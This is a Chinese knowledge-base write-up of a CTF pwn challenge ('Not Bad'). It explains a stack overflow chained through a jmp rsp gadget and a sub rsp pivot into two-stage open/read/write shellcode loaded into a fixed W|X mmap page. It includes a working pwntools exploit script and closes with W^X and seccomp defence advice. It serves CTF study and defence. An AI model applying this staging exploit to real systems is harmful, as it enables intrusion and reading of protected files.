---
id: binary-pwn-sandbox-escape-jmprsp-mmap-wx-two-stage-orw
title: 32 字节栈缓冲区只能多写 0x10 字节：jmp rsp 后 sub rsp 回跳缓冲区起点，借题目自带 mmap W|X 页二阶段载入 ORW shellcode
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: jmprsp-mmap-wx-two-stage-orw
tags:
- binary
- pwn
- ctf
- shellcode
- jmp-rsp
- mmap
- orw
- seccomp
- staging
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V690
  verified_at: '2026-11-13T16:27:54+08:00'
  notes: 已对照原文与12张截图逐图核对；Not Bad 题 checksec(RWX/No PIE)、seccomp(read/write/open/exit)、jmp rsp 0x400A01、mmap 0x123000 -wxp、栈距离32+8、fd3 均与图01-07一致；两阶段 read+call rax 与 sub rsp,0x30 回跳布局与 exp 一致。未复跑PoC
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-jmprsp-mmap-wx-two-stage-orw/
draft: false
kb_aliases:
- 极客大挑战 2019 Not Bad
- Not Bad pwn
- jmp_rsp 0x400A01
- sub rsp 0x30 jmp rsp
- mmap 0x123000
- 两阶段 ORW shellcode
- fd 3 读 flag
---

## 一句话结论

当 32 字节栈缓冲区只允许 `read(0, buf, 0x38)`（比 缓冲区+saved rbp 只多 0x10 字节）、NX 关闭而程序在 main 里已经 `mmap(0x123000, 0x1000, 6, 0x22, -1, 0)` 建好一块固定地址的 W|X 匿名页、并且二进制里有 `jmp rsp` gadget 时，可以先用溢出把返回地址改成 `jmp rsp`，再让紧随其后的 `sub rsp, 0x30; jmp rsp` 把 rsp 校准回缓冲区起点，执行一段只有几十字节的 stage1：`read(0, 0x123000, 0x100)` 把完整 ORW shellcode 读进 mmap 页，然后 `mov rax, 0x123000; call rax` 跳过去执行，`open("./flag")` 后 fd 为 3，`read(3, buf, n)` + `write(1, buf, n)` 打印 flag。

## 原理

- **溢出空间只够放跳板**：`char buf[32]`（0x20 字节），read 长度 0x38（56 字节）。saved rbp 在 +0x20，返回地址在 +0x28；溢出只多出 8 字节返回地址 + 8 字节附加数据（+0x30 起）。因此不可能在栈上一次放完整的 open/read/write shellcode，只能放一个“跳走再读”的短跳板。
- **两次 jmp rsp 的栈算术**：返回地址被覆盖为 `0x400A01`（`jmp rsp`）后，`ret` 使 rip=jmp_rsp、rsp 指向 +0x30。此处放 `sub rsp, 0x30; jmp rsp`：先把 rsp 从 +0x30 减回 +0x00（缓冲区起点），再跳到 rsp，于是执行放在 buf 起始处的 stage1。跳板与返回地址之间用 0x00 填充补齐到 0x28，stage1 实际只有约 0x20 字节仍放得下。
- **mmap 页是题目自己给的**：main 开头 `mmap(0x123000, 0x1000, 6, 0x22, -1, 0)`：`prot=6` 即 `PROT_WRITE|PROT_EXEC`，`flags=0x22` 即 `MAP_PRIVATE|MAP_ANONYMOUS`；vmmap 里该区间显示为可执行的匿名页（0x123000-0x124000）。这段固定地址、可执行的内存正是二阶段 shellcode 的落点，不需要自己再 mprotect/泄漏地址。
- **stage1 只做一次 read + 一次跳转**：`read(0, 0x123000, 0x100)` 把第二段数据写进 mmap 页；返回后 `mov rax, 0x123000; call rax` 直接执行。stage1 不需要知道 libc、不需要 gadget，因此几字节就能写完。
- **seccomp 只禁 execve 类逃逸**：过滤器放行 `read`(0)/`write`(1)/`open`(2)/`exit`(60)，默认 KILL；execve 不在白名单里，所以拿到代码执行后不能弹 shell，必须用 ORW 自己读 flag。
- **fd 号为什么是 3**：进程启动时 0/1/2 已被 stdin/stdout/stderr 占用，`open` 返回的第一个可用描述符是 3；因此 `read(3, ...)` 直接可用。若目标环境额外打开了 fd，应改为把 `open` 的返回值（rax）传给 read。
- **为什么第二段可以直接 call 过去**：mmap 页同时可写可执行（W|X），第一段 read 把字节写入后指令缓存与数据缓存一致，`call rax` 取指即为刚写入的 ORW shellcode；这也是 NX 关闭/显式 W|X 题目中典型的两阶段落地方式。

## 触发条件

- 栈溢出可覆盖返回地址，且二进制内存在 `jmp rsp`（或等价的 `call rsp`）gadget；NX 关闭或另有可执行内存。
- 程序在进入漏洞函数前已经 mmap 了一块地址固定、可写可执行（或可写且随后可执行）的匿名页，地址可从反汇编直接读出。
- 溢出后还能再交互一次（程序仍然存活并等待输入），以便 stage1 执行时从 stdin 读第二段。
- seccomp 放行 open/read/write 或可用替代系统调用；flag 路径已知（如 `./flag`）。

## 利用步骤

1. `checksec` 确认 NX disabled / 无 PIE（或地址可知），`seccomp-tools dump` 确认 open/read/write 可用、execve 被禁。
2. 反汇编 main，记录 mmap 的固定地址（本例 0x123000）和 `jmp rsp` gadget 地址（本例 0x400A01）。
3. 构造 stage1：`read(0, mmap_addr, 0x100)` + `mov rax, mmap_addr; call rax`，长度补齐到 0x28。
4. 在偏移 0x28 放 `p64(jmp_rsp)`，偏移 0x30 放 `sub rsp, 0x30; jmp rsp` 的机器码。
5. 发送第一段；程序 ret 到 jmp rsp、sub rsp 回跳、执行 stage1 的 read，等待第二段输入。
6. 发送第二段 ORW：`open("./flag")`、`read(3, mmap_addr, 0x50)`、`write(1, mmap_addr, 0x50)`。
7. 接收输出得到 flag；若 read 失败，检查 open 是否为 3 号 fd 或改用 rax 传 fd。

## PoC

```python
from pwn import *
context(arch='amd64', os='linux')

p = remote(HOST, PORT)          # 本地可换 process('./pwn')
p.recvuntil('Easy shellcode, have fun!')

mmap_addr = 0x123000            # main 里 mmap(0x123000,0x1000,6,0x22,-1,0)
jmp_rsp   = 0x400A01            # 二进制内 jmp rsp

stage1  = asm(shellcraft.read(0, mmap_addr, 0x100))
stage1 += asm('mov rax, 0x123000; call rax')
payload  = stage1.ljust(0x28, b'\x00')
payload += p64(jmp_rsp)
payload += asm('sub rsp, 0x30; jmp rsp')
p.sendline(payload)

orw  = asm(shellcraft.open('./flag'))
orw += asm(shellcraft.read(3, mmap_addr, 0x50))
orw += asm(shellcraft.write(1, mmap_addr, 0x50))
p.sendline(orw)

p.interactive()
```

要点：stage1 必须在 0x28 字节内写完；`sub rsp, 0x30` 的 0x30 = 返回地址偏移 0x28 + 8，正好从 +0x30 回到缓冲区起点。

## 变体与关联

- **落点偏移算不准**：把 `jmp rsp` gadget 地址重复铺满整个溢出区，rsp 落到任意一格都会滑向尾部 shellcode，见 [[ctf-pwn-shellcode-landing-jmp-rsp-repeat-padding-openat-sendfile]]。
- **首段更短（只给 0x10 字节）**：用首段 read 覆盖自身 + NOP 滑板或 jmp 回跳，见 [[binary-pwn-sandbox-escape-short-shellcode-self-overwrite-nop-sled-orw]]、[[binary-pwn-sandbox-escape-tiny-shellcode-read-self-loop-staging]]、[[binary-pwn-sandbox-escape-register-reuse-reread-staging]]。
- **seccomp 禁掉部分 ORW**：缺 open 用 openat 或 retfq 切 i386 open，缺 read 用 sendfile/preadv/mmap，缺 write 用 writev，分别见 [[binary-pwn-sandbox-escape-orw-missing-open-openat-retfq-i386-open]]、[[binary-pwn-sandbox-escape-orw-missing-read-sendfile-preadv-mmap]]、[[binary-pwn-sandbox-escape-orw-missing-write-writev-pwritev]]。
- **fd 不固定**：把 `open` 的返回值保存到寄存器再作为 read 的 fd，而不是硬编码 3。
- **检测侧关联**：mmap 固定地址 + 可执行匿名页是 CTF 常见“白送代码执行页”的设计，现实中更常见的是 JIT 页或第三方库的 RWX 映射。

## 检测与防御

- 出题/防守：不要在看雪/题目里同时提供固定地址 W|X 页和任意跳转原语；执行前把页面 mprotect 为 R|X（W^X），或一次性读入全部输入、执行期间不再允许 read。
- 现实防御：启用 NX 与 W^X，禁止匿名可执行映射（如 SELinux `execmem` 限制）；seccomp 不要只禁 execve 而放行全部文件读写，flag 由父进程读取后通过管道传入可减小文件读取面。
- 监控：进程出现固定低地址 RWX 匿名映射、随后从该地址取指的行为，是典型的 shellcode staging 特征。
